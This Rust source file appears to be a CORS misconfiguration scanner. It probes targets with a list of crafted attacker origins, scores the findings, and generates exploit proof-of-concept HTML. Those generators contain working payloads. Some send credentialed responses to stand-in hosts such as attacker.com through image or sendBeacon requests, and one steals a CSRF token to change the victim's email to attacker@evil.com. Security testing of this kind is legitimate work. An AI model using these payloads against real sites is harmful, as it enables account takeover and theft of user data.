use std::fmt;

use serde::{Deserialize, Serialize};

/// Severity of a CORS misconfiguration finding.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize, PartialOrd, Ord)]
pub enum CorsSeverity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

impl fmt::Display for CorsSeverity {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::Info => "info",
            Self::Low => "low",
            Self::Medium => "medium",
            Self::High => "high",
            Self::Critical => "critical",
        };
        write!(f, "{label}")
    }
}

/// Category of CORS misconfiguration.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum CorsMisconfigType {
    /// Access-Control-Allow-Origin: * (wildcard).
    WildcardOrigin,
    /// Origin is reflected back verbatim without validation.
    OriginReflection,
    /// Null origin is allowed (sandboxed iframe bypass).
    NullOriginAllowed,
    /// Regex-based origin check with bypass (e.g. evil-example.com matches example.com).
    RegexBypass,
    /// Subdomain wildcard allows any subdomain (*.example.com).
    SubdomainWildcard,
    /// Pre-TLD matching allows sibling domains (example.com.evil.com).
    PreTldBypass,
    /// Credentials allowed with permissive origin.
    CredentialsWithPermissiveOrigin,
    /// Sensitive methods exposed via Access-Control-Allow-Methods.
    SensitiveMethodsExposed,
    /// Wildcard headers in Access-Control-Allow-Headers.
    WildcardHeaders,
    /// Excessive Access-Control-Max-Age (cache poisoning window).
    ExcessiveMaxAge,
    /// Origin validation only checks prefix/suffix (attackerexample.com).
    PartialOriginMatch,
    /// HTTP origin accepted when target is HTTPS (protocol downgrade).
    HttpOriginOnHttps,
    /// Internal/localhost origins accepted from external.
    InternalOriginExposed,
    /// Vary: Origin header missing (cache poisoning).
    MissingVaryOrigin,
}

impl fmt::Display for CorsMisconfigType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::WildcardOrigin => "wildcard-origin",
            Self::OriginReflection => "origin-reflection",
            Self::NullOriginAllowed => "null-origin-allowed",
            Self::RegexBypass => "regex-bypass",
            Self::SubdomainWildcard => "subdomain-wildcard",
            Self::PreTldBypass => "pre-tld-bypass",
            Self::CredentialsWithPermissiveOrigin => "credentials-with-permissive-origin",
            Self::SensitiveMethodsExposed => "sensitive-methods-exposed",
            Self::WildcardHeaders => "wildcard-headers",
            Self::ExcessiveMaxAge => "excessive-max-age",
            Self::PartialOriginMatch => "partial-origin-match",
            Self::HttpOriginOnHttps => "http-origin-on-https",
            Self::InternalOriginExposed => "internal-origin-exposed",
            Self::MissingVaryOrigin => "missing-vary-origin",
        };
        write!(f, "{label}")
    }
}

/// A single CORS probe: origin sent and the response headers received.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CorsProbeResult {
    pub origin_sent: String,
    pub acao: Option<String>,
    pub acac: Option<String>,
    pub acam: Option<String>,
    pub acah: Option<String>,
    pub acma: Option<String>,
    pub vary_header: Option<String>,
    pub status_code: u16,
}

/// A single CORS misconfiguration finding.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CorsFinding {
    pub misconfig_type: CorsMisconfigType,
    pub severity: CorsSeverity,
    pub description: String,
    pub origin_tested: String,
    pub acao_returned: String,
    pub credentials_allowed: bool,
    pub exploit_poc: Option<String>,
    pub credential_exposure_score: f64,
}

/// Full CORS analysis result.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CorsAnalysis {
    pub target_url: String,
    pub probes: Vec<CorsProbeResult>,
    pub findings: Vec<CorsFinding>,
    pub summary: CorsSummary,
}

/// Summary statistics.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CorsSummary {
    pub total_probes: usize,
    pub total_findings: usize,
    pub critical_count: usize,
    pub high_count: usize,
    pub max_credential_exposure: f64,
}

/// Configuration for CORS scanner.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CorsConfig {
    pub target_url: String,
    pub target_domain: String,
    pub generate_poc: bool,
    pub custom_origins: Vec<String>,
}

impl Default for CorsConfig {
    fn default() -> Self {
        Self {
            target_url: String::new(),
            target_domain: String::new(),
            generate_poc: true,
            custom_origins: Vec::new(),
        }
    }
}

impl CorsConfig {
    pub fn with_target(mut self, url: &str, domain: &str) -> Self {
        self.target_url = url.to_string();
        self.target_domain = domain.to_string();
        self
    }

    pub fn with_poc(mut self, enabled: bool) -> Self {
        self.generate_poc = enabled;
        self
    }

    pub fn with_custom_origins(mut self, origins: Vec<String>) -> Self {
        self.custom_origins = origins;
        self
    }
}

/// Generate the comprehensive set of 20+ test origins for a given target domain.
pub fn generate_test_origins(target_domain: &str) -> Vec<(String, &'static str)> {
    let base = target_domain.trim_start_matches("www.");

    vec![
        ("*".to_string(), "wildcard"),
        ("null".to_string(), "null origin"),
        (format!("https://{base}"), "exact match (legitimate)"),
        (format!("http://{base}"), "HTTP protocol downgrade"),
        (format!("https://evil.com"), "unrelated domain"),
        (format!("https://evil-{base}"), "prefix attack"),
        (
            format!("https://{base}.evil.com"),
            "suffix attack (subdomain of attacker)",
        ),
        (format!("https://sub.{base}"), "subdomain"),
        (format!("https://not{base}"), "concatenation attack"),
        (format!("https://{base}%60.evil.com"), "backtick bypass"),
        (format!("https://{base}%0d.evil.com"), "CRLF in origin"),
        (
            format!("https://evil.{base}"),
            "attacker subdomain of target",
        ),
        (
            format!("https://{base}.com.evil.com"),
            "TLD extension attack",
        ),
        (format!("http://localhost"), "localhost"),
        (format!("http://127.0.0.1"), "loopback IP"),
        (format!("http://[::1]"), "IPv6 loopback"),
        (format!("http://0177.0.0.1"), "octal IP"),
        (format!("https://attacker.com"), "generic attacker domain"),
        (format!("https://{base}@evil.com"), "userinfo bypass"),
        (format!("https://{base}#.evil.com"), "fragment bypass"),
        (format!("https://{base}?.evil.com"), "query bypass"),
        (format!("https://EVIL.COM"), "uppercase attacker"),
        (
            format!("https://{}", base.to_uppercase()),
            "uppercase target",
        ),
        (format!("mhtml:https://{base}"), "MHTML protocol"),
    ]
}

/// Analyze a set of CORS probe results for misconfigurations.
pub fn analyze_cors_probes(probes: &[CorsProbeResult], config: &CorsConfig) -> Vec<CorsFinding> {
    let mut findings = Vec::new();

    for probe in probes {
        let acao = probe.acao.as_deref().unwrap_or("");
        let credentials = probe.acac.as_deref() == Some("true");

        if acao == "*" {
            let severity = if credentials {
                CorsSeverity::Critical
            } else {
                CorsSeverity::Medium
            };

            findings.push(CorsFinding {
                misconfig_type: CorsMisconfigType::WildcardOrigin,
                severity,
                description: format!(
                    "Wildcard Access-Control-Allow-Origin: * returned for origin `{}`{}",
                    probe.origin_sent,
                    if credentials { " WITH credentials" } else { "" }
                ),
                origin_tested: probe.origin_sent.clone(),
                acao_returned: acao.to_string(),
                credentials_allowed: credentials,
                exploit_poc: if config.generate_poc {
                    Some(generate_cors_poc(config, &probe.origin_sent, credentials))
                } else {
                    None
                },
                credential_exposure_score: if credentials { 1.0 } else { 0.3 },
            });
        }

        if acao == probe.origin_sent
            && is_malicious_origin(&probe.origin_sent, &config.target_domain)
        {
            let severity = if credentials {
                CorsSeverity::Critical
            } else {
                CorsSeverity::High
            };

            findings.push(CorsFinding {
                misconfig_type: CorsMisconfigType::OriginReflection,
                severity,
                description: format!(
                    "Malicious origin `{}` reflected verbatim in ACAO header{}",
                    probe.origin_sent,
                    if credentials { " WITH credentials" } else { "" }
                ),
                origin_tested: probe.origin_sent.clone(),
                acao_returned: acao.to_string(),
                credentials_allowed: credentials,
                exploit_poc: if config.generate_poc {
                    Some(generate_cors_poc(config, &probe.origin_sent, credentials))
                } else {
                    None
                },
                credential_exposure_score: if credentials { 0.95 } else { 0.5 },
            });
        }

        if probe.origin_sent == "null" && acao == "null" {
            findings.push(CorsFinding {
                misconfig_type: CorsMisconfigType::NullOriginAllowed,
                severity: if credentials {
                    CorsSeverity::Critical
                } else {
                    CorsSeverity::High
                },
                description: format!(
                    "Null origin accepted - exploitable via sandboxed iframe{}",
                    if credentials { " WITH credentials" } else { "" }
                ),
                origin_tested: "null".to_string(),
                acao_returned: "null".to_string(),
                credentials_allowed: credentials,
                exploit_poc: if config.generate_poc {
                    Some(generate_null_origin_poc(config))
                } else {
                    None
                },
                credential_exposure_score: if credentials { 0.9 } else { 0.6 },
            });
        }

        if !acao.is_empty() && acao != "*" && acao != "null" && acao == probe.origin_sent {
            let origin = &probe.origin_sent;
            let domain = &config.target_domain;

            if origin.contains(&format!("{domain}.evil.com"))
                || origin.contains(&format!("{domain}.com.evil"))
            {
                findings.push(CorsFinding {
                    misconfig_type: CorsMisconfigType::PreTldBypass,
                    severity: if credentials {
                        CorsSeverity::Critical
                    } else {
                        CorsSeverity::High
                    },
                    description: format!(
                        "Pre-TLD bypass: `{origin}` accepted - domain suffix matching is broken"
                    ),
                    origin_tested: origin.clone(),
                    acao_returned: acao.to_string(),
                    credentials_allowed: credentials,
                    exploit_poc: if config.generate_poc {
                        Some(generate_cors_poc(config, origin, credentials))
                    } else {
                        None
                    },
                    credential_exposure_score: if credentials { 0.9 } else { 0.5 },
                });
            }

            if origin.starts_with("http://") && config.target_url.starts_with("https://") {
                findings.push(CorsFinding {
                    misconfig_type: CorsMisconfigType::HttpOriginOnHttps,
                    severity: CorsSeverity::High,
                    description: format!(
                        "HTTP origin `{origin}` accepted on HTTPS target - protocol downgrade attack possible"
                    ),
                    origin_tested: origin.clone(),
                    acao_returned: acao.to_string(),
                    credentials_allowed: credentials,
                    exploit_poc: None,
                    credential_exposure_score: if credentials { 0.7 } else { 0.3 },
                });
            }

            if is_internal_origin(origin) {
                findings.push(CorsFinding {
                    misconfig_type: CorsMisconfigType::InternalOriginExposed,
                    severity: CorsSeverity::Medium,
                    description: format!(
                        "Internal origin `{origin}` accepted - SSRF chain possible"
                    ),
                    origin_tested: origin.clone(),
                    acao_returned: acao.to_string(),
                    credentials_allowed: credentials,
                    exploit_poc: None,
                    credential_exposure_score: 0.2,
                });
            }

            if origin.contains(&format!("evil-{domain}"))
                || origin.contains(&format!("not{domain}"))
            {
                findings.push(CorsFinding {
                    misconfig_type: CorsMisconfigType::PartialOriginMatch,
                    severity: if credentials { CorsSeverity::Critical } else { CorsSeverity::High },
                    description: format!(
                        "Partial origin match: `{origin}` accepted - suffix/contains check is insufficient"
                    ),
                    origin_tested: origin.clone(),
                    acao_returned: acao.to_string(),
                    credentials_allowed: credentials,
                    exploit_poc: if config.generate_poc {
                        Some(generate_cors_poc(config, origin, credentials))
                    } else {
                        None
                    },
                    credential_exposure_score: if credentials { 0.9 } else { 0.5 },
                });
            }

            if origin.contains(&format!("sub.{domain}")) {
                findings.push(CorsFinding {
                    misconfig_type: CorsMisconfigType::SubdomainWildcard,
                    severity: CorsSeverity::Medium,
                    description: format!(
                        "Subdomain `{origin}` accepted - XSS on any subdomain can chain to CORS bypass"
                    ),
                    origin_tested: origin.clone(),
                    acao_returned: acao.to_string(),
                    credentials_allowed: credentials,
                    exploit_poc: None,
                    credential_exposure_score: if credentials { 0.5 } else { 0.2 },
                });
            }
        }

        if credentials
            && (acao == "*" || acao == "null" || is_malicious_origin(acao, &config.target_domain))
        {
            let already_has = findings.iter().any(|f| {
                f.misconfig_type == CorsMisconfigType::CredentialsWithPermissiveOrigin
                    && f.origin_tested == probe.origin_sent
            });
            if !already_has {
                findings.push(CorsFinding {
                    misconfig_type: CorsMisconfigType::CredentialsWithPermissiveOrigin,
                    severity: CorsSeverity::Critical,
                    description: format!(
                        "Credentials allowed (ACAC: true) with permissive origin `{}` - full account takeover chain",
                        acao
                    ),
                    origin_tested: probe.origin_sent.clone(),
                    acao_returned: acao.to_string(),
                    credentials_allowed: true,
                    exploit_poc: if config.generate_poc {
                        Some(generate_credential_theft_poc(config, &probe.origin_sent))
                    } else {
                        None
                    },
                    credential_exposure_score: 1.0,
                });
            }
        }

        if let Some(methods) = &probe.acam {
            let dangerous_methods: Vec<&str> = methods
                .split(',')
                .map(|m| m.trim())
                .filter(|m| matches!(m.to_uppercase().as_str(), "PUT" | "DELETE" | "PATCH"))
                .collect();

            if !dangerous_methods.is_empty()
                && is_malicious_origin(&probe.origin_sent, &config.target_domain)
            {
                findings.push(CorsFinding {
                    misconfig_type: CorsMisconfigType::SensitiveMethodsExposed,
                    severity: CorsSeverity::Medium,
                    description: format!(
                        "Sensitive HTTP methods {:?} exposed to origin `{}`",
                        dangerous_methods, probe.origin_sent
                    ),
                    origin_tested: probe.origin_sent.clone(),
                    acao_returned: acao.to_string(),
                    credentials_allowed: credentials,
                    exploit_poc: None,
                    credential_exposure_score: 0.3,
                });
            }
        }

        if let Some(headers) = &probe.acah {
            if headers.trim() == "*" {
                findings.push(CorsFinding {
                    misconfig_type: CorsMisconfigType::WildcardHeaders,
                    severity: CorsSeverity::Low,
                    description: format!(
                        "Wildcard Access-Control-Allow-Headers for origin `{}`",
                        probe.origin_sent
                    ),
                    origin_tested: probe.origin_sent.clone(),
                    acao_returned: acao.to_string(),
                    credentials_allowed: credentials,
                    exploit_poc: None,
                    credential_exposure_score: 0.1,
                });
            }
        }

        if let Some(max_age) = &probe.acma {
            if let Ok(seconds) = max_age.trim().parse::<u64>() {
                if seconds > 86400 {
                    findings.push(CorsFinding {
                        misconfig_type: CorsMisconfigType::ExcessiveMaxAge,
                        severity: CorsSeverity::Low,
                        description: format!(
                            "Excessive Access-Control-Max-Age: {} seconds ({:.1} days) - extends cache poisoning window",
                            seconds,
                            seconds as f64 / 86400.0
                        ),
                        origin_tested: probe.origin_sent.clone(),
                        acao_returned: acao.to_string(),
                        credentials_allowed: credentials,
                        exploit_poc: None,
                        credential_exposure_score: 0.05,
                    });
                }
            }
        }

        if !acao.is_empty()
            && acao != "*"
            && probe
                .vary_header
                .as_deref()
                .map_or(true, |v| !v.contains("Origin"))
        {
            findings.push(CorsFinding {
                misconfig_type: CorsMisconfigType::MissingVaryOrigin,
                severity: CorsSeverity::Medium,
                description: format!(
                    "ACAO set to `{acao}` but Vary: Origin is missing - response cache poisoning possible"
                ),
                origin_tested: probe.origin_sent.clone(),
                acao_returned: acao.to_string(),
                credentials_allowed: credentials,
                exploit_poc: None,
                credential_exposure_score: 0.2,
            });
        }
    }

    findings.sort_by(|a, b| b.severity.cmp(&a.severity));
    findings
}

fn is_malicious_origin(origin: &str, target_domain: &str) -> bool {
    let clean = origin
        .trim_start_matches("https://")
        .trim_start_matches("http://");

    if clean == target_domain || clean == format!("www.{target_domain}") {
        return false;
    }

    if clean.starts_with(&format!("sub.{target_domain}")) {
        return false;
    }

    true
}

fn is_internal_origin(origin: &str) -> bool {
    let internal_indicators = [
        "localhost",
        "127.0.0.1",
        "::1",
        "0.0.0.0",
        "10.",
        "172.16.",
        "172.17.",
        "172.18.",
        "172.19.",
        "172.20.",
        "172.21.",
        "172.22.",
        "172.23.",
        "172.24.",
        "172.25.",
        "172.26.",
        "172.27.",
        "172.28.",
        "172.29.",
        "172.30.",
        "172.31.",
        "192.168.",
        "0177.",
        "internal",
        "intranet",
    ];

    let lower = origin.to_lowercase();
    internal_indicators.iter().any(|i| lower.contains(i))
}

/// Run the full CORS misconfiguration analysis.
pub fn analyze_cors(probes: &[CorsProbeResult], config: &CorsConfig) -> CorsAnalysis {
    let findings = analyze_cors_probes(probes, config);

    let critical_count = findings
        .iter()
        .filter(|f| f.severity == CorsSeverity::Critical)
        .count();
    let high_count = findings
        .iter()
        .filter(|f| f.severity == CorsSeverity::High)
        .count();
    let max_exposure = findings
        .iter()
        .map(|f| f.credential_exposure_score)
        .fold(0.0f64, f64::max);

    let summary = CorsSummary {
        total_probes: probes.len(),
        total_findings: findings.len(),
        critical_count,
        high_count,
        max_credential_exposure: max_exposure,
    };

    CorsAnalysis {
        target_url: config.target_url.clone(),
        probes: probes.to_vec(),
        findings,
        summary,
    }
}

/// Build a CorsProbeResult from simplified inputs (for testing or quick analysis).
pub fn build_probe(
    origin: &str,
    acao: Option<&str>,
    acac: Option<&str>,
    acam: Option<&str>,
    acah: Option<&str>,
    acma: Option<&str>,
    vary: Option<&str>,
) -> CorsProbeResult {
    CorsProbeResult {
        origin_sent: origin.to_string(),
        acao: acao.map(String::from),
        acac: acac.map(String::from),
        acam: acam.map(String::from),
        acah: acah.map(String::from),
        acma: acma.map(String::from),
        vary_header: vary.map(String::from),
        status_code: 200,
    }
}

/// Compute an overall CORS security score (0.0 = fully exploitable, 1.0 = secure).
pub fn compute_cors_score(findings: &[CorsFinding]) -> f64 {
    if findings.is_empty() {
        return 1.0;
    }

    let max_exposure = findings
        .iter()
        .map(|f| f.credential_exposure_score)
        .fold(0.0f64, f64::max);

    (1.0 - max_exposure).max(0.0)
}

/// Generate exploitation PoC HTML for a CORS misconfiguration.
pub fn generate_cors_poc(config: &CorsConfig, origin: &str, with_creds: bool) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>CORS Exploitation PoC</title></head>
<body>
<h1>CORS Misconfiguration Exploit</h1>
<p>Target: {target}</p>
<p>Attacker origin: {origin}</p>
<div id="stolen"></div>
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "{target}", true);
{creds}
xhr.onreadystatechange = function() {{
    if (xhr.readyState === 4) {{
        document.getElementById("stolen").textContent = "Response: " + xhr.responseText;
        // Exfiltrate to attacker server
        new Image().src = "{origin}/collect?data=" + encodeURIComponent(xhr.responseText);
    }}
}};
xhr.send();
</script>
</body>
</html>"#,
        target = config.target_url,
        origin = origin,
        creds = if with_creds {
            "xhr.withCredentials = true;"
        } else {
            ""
        },
    )
}

/// Generate PoC for null origin exploitation via sandboxed iframe.
pub fn generate_null_origin_poc(config: &CorsConfig) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>CORS Null Origin Exploit</title></head>
<body>
<h1>Null Origin CORS Bypass via Sandboxed iframe</h1>
<p>Target: {target}</p>
<iframe sandbox="allow-scripts allow-forms" srcdoc='
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "{target}", true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {{
    if (xhr.readyState === 4) {{
        // origin is null inside sandboxed iframe
        parent.postMessage(xhr.responseText, "*");
    }}
}};
xhr.send();
</script>
'></iframe>
<script>
window.addEventListener("message", function(e) {{
    document.write("<pre>Stolen data: " + e.data + "</pre>");
}});
</script>
</body>
</html>"#,
        target = config.target_url,
    )
}

/// Generate PoC for credential theft via CORS misconfiguration.
pub fn generate_credential_theft_poc(config: &CorsConfig, origin: &str) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>CORS Credential Theft PoC</title></head>
<body>
<h1>Full Credential Theft via CORS Misconfiguration</h1>
<p>Target: {target}</p>
<div id="result"></div>
<script>
// Step 1: Steal user data
fetch("{target}/api/me", {{
    credentials: "include",
    mode: "cors"
}}).then(r => r.json()).then(data => {{
    document.getElementById("result").textContent = "Account data: " + JSON.stringify(data);
    // Step 2: Steal CSRF token
    return fetch("{target}/api/csrf-token", {{ credentials: "include" }});
}}).then(r => r.json()).then(csrf => {{
    // Step 3: Perform action as victim
    return fetch("{target}/api/settings", {{
        method: "POST",
        credentials: "include",
        headers: {{ "Content-Type": "application/json", "X-CSRF-Token": csrf.token }},
        body: JSON.stringify({{ email: "attacker@evil.com" }})
    }});
}}).then(() => {{
    document.getElementById("result").textContent += " | Account hijacked!";
    new Image().src = "{origin}/success";
}});
</script>
</body>
</html>"#,
        target = config.target_url,
        origin = origin,
    )
}

/// Generate PoC for subdomain takeover chained with CORS bypass.
pub fn generate_subdomain_chain_poc(config: &CorsConfig, subdomain: &str) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>Subdomain Takeover + CORS Chain</title></head>
<body>
<h1>Subdomain Takeover Chained with CORS</h1>
<p>Taken over subdomain: {subdomain}</p>
<p>Target: {target}</p>
<script>
// This page is served from the taken-over subdomain
// which is in the CORS allowlist
fetch("{target}/api/sensitive-data", {{
    credentials: "include"
}}).then(r => r.text()).then(data => {{
    // Exfiltrate
    navigator.sendBeacon("https://attacker.com/collect", data);
}});
</script>
</body>
</html>"#,
        target = config.target_url,
        subdomain = subdomain,
    )
}
